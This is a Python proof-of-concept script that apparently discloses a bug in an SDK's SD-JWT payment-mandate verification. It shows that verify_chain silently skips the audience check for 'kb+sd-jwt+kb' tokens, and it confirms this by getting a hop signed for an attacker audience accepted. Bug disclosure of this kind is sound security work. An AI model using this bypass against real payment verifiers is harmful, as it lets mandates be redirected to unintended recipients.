"""PoC: expected_aud is silently not enforced for kb+sd-jwt+kb.

The defect
--------
``ap2.sdk.sdjwt.chain.verify_chain`` documents:

    «index i (KB-SD-JWT): verified with the previous hop's ``cnf.jwk`` via
    kb_sd_jwt.verify, enforcing ``expected_aud`` / ``expected_nonce`` on the
    terminal hop when provided»

But ``kb_sd_jwt.verify`` calls ``common.verify_expected_claims`` only when
``typ in TYP_TERMINAL``:

    TYP_TERMINAL     = ['kb+sd-jwt',    'kb-sd-jwt']
    TYP_INTERMEDIATE = ['kb+sd-jwt+kb', 'kb-sd-jwt+kb']

A token of type ``kb+sd-jwt+kb`` — which the SDK itself produces when the
payload carries a ``cnf`` claim, see kb_sd_jwt_tests — falls into INTERMEDIATE,
so the aud/nonce check **never runs at all**, even though the caller explicitly
passed ``expected_aud``.

Consequence: a merchant relying on the audience check gets silent protection
that does not exist. Substituting aud produces no refusal.

Usage
-----
    .venv/bin/python tools/poc_aud_not_enforced.py

Expected output: ``VERDICT: DEFECT CONFIRMED`` — a token was accepted that
must have been rejected.
"""

from __future__ import annotations

import json

from ap2.sdk.disclosure_metadata import DisclosureMetadata
from ap2.sdk.generated.open_payment_mandate import OpenPaymentMandate
from ap2.sdk.sdjwt import kb_sd_jwt, sd_jwt
from ap2.sdk.sdjwt.chain import verify_chain
from ap2.sdk.sdjwt.common import parse_token
from cryptography.hazmat.primitives.asymmetric import ec
from jwcrypto.jwk import JWK

EXPECTED_AUD = "https://honest-merchant.example/ap2"
ATTACKER_AUD = "https://attacker.example/ap2"


def key(kid: str) -> JWK:
    jwk = JWK.from_pyca(ec.generate_private_key(ec.SECP256R1()))
    raw = json.loads(jwk.export())
    raw["kid"] = kid
    return JWK.from_json(json.dumps(raw))


class IssuerProvider:
    def __init__(self, jwk_dict: dict) -> None:
        self._k = JWK.from_json(json.dumps(jwk_dict))

    def __call__(self, token) -> JWK:  # noqa: ARG002
        return self._k


def main() -> int:
    issuer = key("poc-issuer")
    agent = key("poc-agent")

    mandate = OpenPaymentMandate(
        constraints=[],
        cnf={"jwk": json.loads(agent.export_public())},
        payment_amount={"amount": 100, "currency": "USD"},
        payee={"id": "shop", "name": "Shop"},
        payment_instrument={"id": "pi", "type": "credit"},
        execution_date="2099-01-01T00:00:00Z",
    )
    sd = DisclosureMetadata(sd_keys=[])

    root = sd_jwt.create(payload=mandate, issuer_key=issuer, sd=sd).sd_jwt_issuance
    # The agent signs the hop for the WRONG recipient — that is the attack.
    hop = kb_sd_jwt.create(
        prev_token=parse_token(root),
        holder_key=agent,
        payload=mandate,
        aud=ATTACKER_AUD,
        nonce="poc-nonce",
        sd=sd,
    ).sd_jwt_issuance

    print("  hop type      : kb+sd-jwt+kb (per TYP_INTERMEDIATE)")
    print(f"  aud in token  : {ATTACKER_AUD}")
    print(f"  expected_aud    : {EXPECTED_AUD}")
    print("  audiences do NOT match — a correct verifier must reject\n")

    try:
        verify_chain(
            [parse_token(root), parse_token(hop)],
            IssuerProvider(json.loads(issuer.export_public())),
            expected_aud=EXPECTED_AUD,
            expected_nonce="poc-nonce",
        )
    except Exception as exc:  # noqa: BLE001
        print(f"  REJECTED: {type(exc).__name__}: {str(exc)[:90]}")
        print("\n  VERDICT: defect NOT reproduced — either fixed or the typ differs")
        return 0

    print("  ACCEPTED a token with the wrong audience.")
    print("\n  VERDICT: DEFECT CONFIRMED")
    print("  expected_aud was passed to verify_chain, but verify_expected_claims was never called,")
    print("  because typ='kb+sd-jwt+kb' lands in TYP_INTERMEDIATE rather than TYP_TERMINAL.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())